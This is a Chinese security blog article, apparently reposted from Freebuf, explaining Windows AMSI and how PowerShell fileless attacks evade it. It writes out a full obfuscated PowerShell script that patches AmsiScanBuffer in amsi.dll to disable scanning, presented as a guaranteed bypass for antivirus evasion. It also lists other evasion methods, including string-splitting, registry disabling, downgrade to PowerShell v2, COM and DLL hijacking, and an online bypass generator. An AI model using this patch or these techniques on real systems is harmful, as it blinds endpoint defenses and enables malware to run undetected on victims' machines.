<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/uQp_4VQv0Q1WpcGLABGwNg)

点击蓝字

![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/oGEm9WNbjnY8CVGX24hjYjUvFLq0dSywDGOLNkGibyicB467bdHV2slwUa9U7tlJKQqI9ibBXzeqDDDujO7rpyMQg/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&wx_co=1)

引导关注

![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/oGEm9WNbjnY8CVGX24hjYjUvFLq0dSywKFRozxyy5cjWI35YZCqoXv5eE0xbneicl67ibTCdoE1ppG3Za0essC9Q/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&wx_co=1)

  

**Powershell 攻击**
-----------------

**powershell无文件落地执行**作为一类内网免杀的利器，在Windows环境下被广泛的使用；攻击者利用Poweshell可以降低恶意软件被查杀的概率，同时也是无文件落地攻击的常用手段；在内网免杀中`Powershell`具有很重要的作用（例如：Powershell可以用于入侵，下载，权限维持，横向移动等攻击阶段）

作为Windows系统内置工具， Powershell脚本的功能十分强大，同时作为系统的功能组件不会被常规杀毒引擎查杀。兼具这两个特点，Powershell的恶意利用程序得到快速发展，从2012年Powershell 攻击利用工具成型化以来，互联网中的通过无文件与Powershell的攻击事件数量逐年递增。无文件攻击在感染计算机时，不需写入磁盘即可从事恶意活动，绕过那些基于签名和文件检测的传统安全软件。如何检测这些恶意行为成了安全厂商和企业用户与个人更为关心的问题。微软在2015年中旬开始提出了针对无文件攻击和Powershell脚本攻击的检测方案-AMSI。

  

**利用工具**

> msfvenom与CS是常见的内网免杀利用框架
> 
>   
> 
> Powersploit和Nishang是后渗透利用框架，集成了后门，提权，信息收集，RCE等功能
> 
>   
> 
> Powershell Empire和PSAttack都是不依赖于powershell.exe的PowerShell利用框架（它们分别使用python和.NET重新封装了脚本解释器，执行相关渗透脚本）

  

**无文件落地攻击**  

究竟什么是无文件威胁？

答：无文件表明威胁不会出现在文件当中（例如：仅存在于机器内存中的后门）；该有时也可用于描述依赖文件进行操作的恶意软件系列与攻击涉及执行、持久性或信息窃取等功能的多个方面。也可说攻击链的某些部分可能是无文件的，而其他部分可能以某种形式涉及文件系统

  

![图片](https://mmbiz.qpic.cn/sz_mmbiz_gif/oGEm9WNbjnY8CVGX24hjYjUvFLq0dSywKFRozxyy5cjWI35YZCqoXv5eE0xbneicl67ibTCdoE1ppG3Za0essC9Q/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&wx_co=1)

  

**AMSI（反病毒接口）解析**
-----------------

###   

### **AMSI（反病毒接口）基础**

什么是AMSI？

答：Windows 反恶意软件扫描接口 (AMSI) 是一种通用接口标准，它允许您的应用程序和服务与机器上存在的任何反恶意软件产品集成。AMSI 为您的最终用户及其数据、应用程序和工作负载提供增强的恶意软件保护。（Win Server 2016和Win 10上已默认安装并启用）

**AMSI原理**

在接受任意脚本后，通过脚本引擎执行；当脚本准备提供脚本引擎时，应用程序可以调用 Windows AMSI API接口来对内容进行扫描；这样，在决定是否继续执行脚本前，可以安全地确定脚本是否存在恶意（AMSI不仅可以用来扫描脚本和代码命令，也可以用来扫描内存或者宏.......）  

  

AMSI标准允许系统上安装的杀毒软件对系统进行深度的监控扫描，而且无需用户参与；允许基于AMSI接口的安全软件（不支持大多数国产软件调用），通过AMSI接口扫描文件，内存、数据流等，进行内容源的URL/IP认证检查，并采用技术手段识别恶意行为

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**检测目的**

> 对抗基于脚本的攻击检测
> 
> 对抗无文件攻击检测

**检测范围**

> 1.Powershell.exe执行的脚本  
> 2.不使用powershell.exe的情况下运行脚本  
> 3.使用单独的psattack  
> 4.System.Automation.Dll  
> 5.从WMI命名空间、注册表键和事件记录日志中加载脚本  
> 6.应用白名单绕过方式InstallUtil，regsrv32和rundll32

####   

#### **AMSI检测步骤**

```
`等待恶意文件加载payload``文件运行时,会通过缓冲区中记录数据和参数调用Win32,COM, VBA.....API接口``AMSI通过监控着缓冲区中的情况，如果恶意代码调用了敏感的API或数据交互，就可以触发AMSI报警``从而AMSI停止恶意代码执行并从循环缓冲区提取传递内容``接着ASMI把提取的内容传送给杀软``最后更据杀软分析数据后的结果，做出判断``若行为是无恶意的,那么代码可以执行；否则,关闭会话并且发出响应警报和处理恶意代码`
```

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

### ASMI进阶

反恶意软件扫描接口 (AMSI) 可帮助防病毒程序检测"基于脚本的攻击"——例如恶意 PowerShell 或Microsoft Office宏。即使使用的脚本被严重混淆；也会出现必须将纯未混淆代码提供给脚本引擎的点。这时可以调用AMSI 进行拦截。

```
`用户的帐户控制，或UAC(EXE、COM、MSI或ActiveX时的权限提升)``Powershell(脚本、交互式使用和动态代码执行)``Windows脚本主机(wscript.exe和cscript.exe)``JavaScript和VBScript``Office VBA宏`
```

```
  

```

AMSI的意义在于：无论我们的恶意脚本是经过多次模糊处理还是远程执行AMSI都可以在脚本注入内存前检测到；这是普通的静态杀毒软件是没办法做到的

  

**补充：**调用AMSI的意义是在脚本解密到注入内存之前去扫描查杀，以防止目标受到攻击

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

**AMSI（反病毒接口）免杀**
-----------------

#### **绕过字符串检测**

如何绕过字符串检测？

答：可以使用编码或者分割成块，然后拼接来绕过

> 1.  可以把单词分成两块或者多块然后进行拼接；
>     
> 
> 2.  使用Replace函数去替换字符串内容
>     
> 
> 3.  使用Base64编码绕过AMSI检查；
>     
> 
> 4.  使用XOR来绕过AMSI，并在运行时将字符串解码回内存；
>     

  

#### **通过修补AMSI.dll操作码绕过**

  

这里通过Base64的混淆加密，使用IEX去执行解密后的密文，即如下图所示：

```
解密数据 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(加密数据))
```

如果怕代码被云防护标记，可以添加乱码进行混淆（例如：字符串的分裂和拼接或者转换成ASCLL字符码）  

```
`$ftkgk = @"``using System;``using System.Runtime.InteropServices;``public class ftkgk {` `[DllImport("kernel32")]` `public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);` `[DllImport("kernel32")]` `public static extern IntPtr LoadLibrary(string name);` `[DllImport("kernel32")]` `public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr gusdon, uint flNewProtect, out uint lpflOldProtect);``}``"@``Add-Type $ftkgk``#通过 rasta-mouse 修补 amsi.dll AmsiScanBuffer``$lospbeo = [ftkgk]::LoadLibrary("$(('âms'+'í.d'+'ll').NOrMALiZe([cHAr](58+12)+[cHAR](111+96-96)+[cHAr](114+68-68)+[char](109+99-99)+[chAR]([bYte]0x44)) -replace [CHAr](92+22-22)+[CHaR](112)+[cHAr]([bYTE]0x7b)+[ChaR]([BYTe]0x4d)+[chAR]([byTE]0x6e)+[ChaR](125))")``$bhijoj = [ftkgk]::GetProcAddress($lospbeo, "$(('ÁmsìScànB'+'uffer').NOrmalizE([ChaR](70+60-60)+[chAR](111+76-76)+[chaR](114)+[char](109*69/69)+[CHAr]([ByTE]0x44)) -replace [ChaR](74+18)+[ChAR]([BYTE]0x70)+[cHAr](123)+[cHaR](77+31-31)+[CHar](110+64-64)+[Char](125+30-30))")``$p = 0``[ftkgk]::VirtualProtect($bhijoj, [uint32]5, 0x40, [ref]$p)``$jniv = "0xB8"``$kgmv = "0x57"``$odgn = "0x00"``$zalk = "0x07"``$cfun = "0x80"``$macm = "0xC3"``$hquzq = [Byte[]] ($jniv,$kgmv,$odgn,$zalk,+$cfun,+$macm)``[System.Runtime.InteropServices.Marshal]::Copy($hquzq, 0, $bhijoj, 6)`
```

  

**绕过原理**

绕过的关键是这段代码可以阻断ASMI.dll中`AmsiScanBuffer()`函数的扫描进程;这种方法（即如下POC 代码）可以百分之百绕过AMSI

```
`HRESULT AmsiScanBuffer(` `HAMSICONTEXT amsiContext,` `PVOID buffer,   //缓冲区` `ULONG length,   //长度` `LPCWSTR contentName,` `HAMSISESSION amsiSession,` `AMSI_RESULT *result` `);`
```

该函数获取要扫描的所需缓冲区和缓冲区长度；其中一个参数"内存溢出"本质上是绕过的关键。此参数包含要扫描的字符串的内存大小。如果通过某种方式将参数设置为常数值零，则AMSI将被有效地绕过，我们需要做的就是在保存缓冲区的函数中修补寄存器。通过这样做扫描将在零长度上执行。这是通过在运行时修补 AMSI.dll 的操作码来实现的

####   

#### **禁用AMSI**

修改注册表，将`HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable`的值更改为0；当然关闭Windows Defender 也可以使系统自带的AMSI检测无效化，这里注意当前权限

  

**禁用AMSI**

  

> 修改注册表，将HKCU\Software\Microsoft\Windows \Settings\AmsiEnable的表项值置为0
> 
> 关闭Windows Defender使系统自带的AMSI检测无效化
> 
> 利用反射将内存中AmsiScanBuffer方法的检测长度置为0

####   

#### **通过Memory Patching工具绕过**

这种方法并不算绕过ASMI，而是通过工具；使得从powershell3.0开始，我们要完全绕过AMSI并执行任意powershell脚本的话，就需要完全禁用它（参考链接：`https://github.com/RythmStick/AMSITrigger`）

AMSITrigger 将通过逐行使用 AMSIScanBuffer 反复调用 AMSI 来识别 powershell 文件中的所有恶意字符串。收到 AMSI_RESULT_DETECTED 响应代码后，将仔细检查该行以识别各个触发器

  

#### **降级攻击**

  

因为PowerShell v2版不支持AMSI；作为常用手段，将目标主机中的PowerShell降级至PowerShell v2版本

  

#### **COM劫持**

  

寻找优先加载并无效的COM表项，在注册表中将Provider的路径指向到无效路径。这样Powershell中的AMSI功能将无法加载从而失效；还可以通过DLL劫持绕过AMSI。

  

#### **DLL劫持**

首先，我们先看下应用程序导入DLL优先级（Windows XP SP2以后版本）

> 进程对应的应用程序所在目录；
> 
> 系统目录（通过 GetSystemDirectory 获取）；
> 
> 16位系统目录；
> 
> Windows目录（通过 GetWindowsDirectory 获取）；
> 
> 当前目录；
> 
> PATH环境变量中的各个目录；

可以看到第一条，与应用程序同级的目录的dll会被优先加载。利用这一点。我们在`C:\Windows\System32\WindowsPowerShell\v1.0`下放置一个伪造AMSI.dll，就可以实现DLL劫持，而不会调用系统的amsi.dll（`C:\Windows\System32\asmi.dll`）  

####   

#### **Bypass AMSI在线平台**

这里使用的是一个在线平台，平台可以直接生成powershell代码，这些代码可以直接破坏或者禁用当前进程的AMSI，每次生成的代码都是被混淆的，所以完全不担心会被检测到（链接地址：`https://amsi.fail`）

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

根据上述方法，对powershell代码进行了免杀实验结果如下： ![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**简单总结：**本篇文章主要简单讲述了AMSI是什么，AMSI的工作流程，AMSI接口利用的背景及原因；由于文章篇幅的原因，关于ASMI深层次的挖掘、具体利用方法、以及如何防御手段没来得及说明；有机会在和大家分享！

本文作者：面包and牛奶，转载于Freebuf

原文地址：https://www.freebuf.com/articles/system/327427.html

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

END

  

往期回顾

  

#

[基于Windows系统下的入侵排查](http://mp.weixin.qq.com/s?__biz=Mzg3Mjc1MDM1Nw==&mid=2247484990&idx=1&sn=d6212a4dba93defccc73811ba4e12e17&chksm=ceebca44f99c4352640122343214aff69989b4290abec06dcf76d1af1f8698965490ce55b5e7&scene=21#wechat_redirect)  

#

[PHP不死马和Python内存马的分析与总结](http://mp.weixin.qq.com/s?__biz=Mzg3Mjc1MDM1Nw==&mid=2247484938&idx=1&sn=332cd7e71e0ff52673497d363c68606f&chksm=ceebca70f99c4366fb3f4f7a618fe58eeabe75db287c8fc0d0e5276de81d930b3e1c444e96ae&scene=21#wechat_redirect)  

#

[经典weblogic未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=Mzg3Mjc1MDM1Nw==&mid=2247484929&idx=1&sn=160f52d8f9d56d9344f256b6b7322b2b&chksm=ceebca7bf99c436d8fae99b7c01d23f64b74347cbc0b1ff8941aaea7a1bc9644677310415a38&scene=21#wechat_redirect)  

#

  

[Spring框架远程命令执行复现（CVE-2022-22965）](http://mp.weixin.qq.com/s?__biz=Mzg3Mjc1MDM1Nw==&mid=2247485019&idx=1&sn=5b35c61a010598904a086bf77db87f95&chksm=ceebca21f99c4337dc65b38393da876e623b9e69a1b6c7edf8ea8e230b6d4c8b82d95bb79098&scene=21#wechat_redirect)